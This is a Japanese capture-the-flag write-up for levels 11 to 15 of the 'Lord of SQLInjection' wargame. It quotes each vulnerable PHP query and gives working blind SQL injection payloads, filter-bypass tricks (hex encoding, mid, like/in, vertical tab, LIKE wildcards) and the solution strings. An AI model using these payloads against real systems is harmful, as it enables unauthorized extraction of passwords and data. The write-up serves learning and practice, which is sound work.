# Lord of SQLInjection writeup 11-15
## 11 - golem
>  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'";

04,07と同じだが禁止文字が増え、`substr`も`=`も使えない。    
`=`の代わりに、文字列は`like`、数値は`<`を使ってみる。  
```
?pw='||id like'admin'%26%26length(pw)<2%23
?pw='||id like'admin'%26%26length(pw)<3%23
:
?pw='||id like'admin'%26%26length(pw)<8%23
?pw='||id like'admin'%26%26length(pw)<9%23
```
`<8`と`<9`のところで結果が変わったので、また8文字だろう。  
次はパスワードを1文字ずつ見ていくが、`substr`が使えないので`mid`を使ってみる。
```
?pw='||id='admin'%26%26mid(pw,1,1)like'0'%23
?pw='||id='admin'%26%26mid(pw,1,1)like'1'%23
?pw='||id='admin'%26%26mid(pw,1,1)like'2'%23
:
```
そろそろスクリプトで自動化しないとつらい。

### 回答例
```
?pw=77d6290b
```
> query : select id from prob_golem where id='guest' and pw='77d6290b'

## 12 - darkknight
> $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 

また同じパターンで、さらに禁止文字が増えている。  
`pw`は文字列が想定されており、SQL文で変数の前後が`'`で囲まれているが、  
`'`が禁止されているので、ここを抜け出すのはつらい。  
もう1つのパラメータ`no`は数値が想定されており、`'`を使わずに後ろに追記できるので、こちらを攻める。  

また8文字だろうと期待して試行。
`'`が使えないので問題03と同じく、Hex済みの`admin`を使う。   
数値にもlikeが使えたので、`<`を使うのはやめた。
```
?no=0 or id like 0x61646d696e and length(pw) like 8
```
パスワードを試していく。
```
?no=0 or id like 0x61646d696e and mid(pw,1,1) like 0
```
1文字目は`0`でうまくいったが、2文字目はどうも数字ではない模様。  
`'`が使えないので、16進数で表記した`a`、`0x61`から試していく。  
```
?no=0 or id like 0x61646d696e and mid(pw,2,1) like 0x61
?no=0 or id like 0x61646d696e and mid(pw,2,1) like 0x62
```
すぐ見つかってよかった。2文字目は`b`のようだ。あとはひたすら続ける。  

### 回答例
```
?pw=0b70ea1f
```
> query : select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=

## 13 - bugbear
> $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}";

さらに色々使えなくなっている。`like`に`0x`、`半角スペース`まで封じられている。  
パスワードがまた親切にも8文字であることを期待して、1文字目が`a`の`id`を取ってくる。  
`0x`を封じられたので、`id`の方を`Hex`関数を使って16進数に変えてあげる。  
```
?no=0||hex(mid(id,1,1))in(61)%26%26length(pw)in(8)
```
パスワードを試していく。  
数字の0-9は0x30から0x39、小文字のa-fは0x61から0x66。
```
?no=0||hex(mid(id,1,1))in(61)%26%26hex(mid(pw,1,1))in(30)
?no=0||hex(mid(id,1,1))in(61)%26%26hex(mid(pw,1,1))in(31)
?no=0||hex(mid(id,1,1))in(61)%26%26hex(mid(pw,1,1))in(32)
:
```

### 回答例
```
?pw=52dc3991
```
> query : select id from prob_bugbear where id='guest' and pw='52dc3991' and no=

## 14 - giant
> $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 

半角スペースなしでつながっている`from`とテーブル名の間にGETパラメータ`shit`が入る。  
もちろん`shit`に半角スペースは許可されていないし、`\n`、`\r`、`\t`も禁止されているし、  
strlen関数を使って1文字より長いとエラーにしている。  

それ以外の特殊記号をあたってみればよい。  
垂直タブVTなら`0x0b`、フォームフィードFFなら`0x0c`。

### 回答例
```
?shit=%0b
```
> query : select 1234 fromprob_giant where 1

## 15 - assassin 
> $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 

`'`が禁じられているので、`like`条件から抜けることができない。  
ひとまず`?pw=%`としてみると、Hello guestと言われてしまう。   

いままでの傾向から、パスワードに使われているのは0-9とa-fだと信じ、  
adminのパスワードが当たるまでひたすら試してみる。  

まず1文字目
```
?pw=0%
?pw=1%
:
?pw=f%
```
全部guestだと言われる。

つづいて2文字目
```
?pw=_0%
?pw=_1%
:
?pw=_f%
```
やっぱり全部guestだと言われる。

一応3文字目
```
?pw=__0%
?pw=__1%
?pw=__2%
```
どうやらパスワードの3文字目は、guestとadminで異なるようだ。

### 回答例
```
?pw=__2%
```
> query : select id from prob_assassin where pw like '__2%'
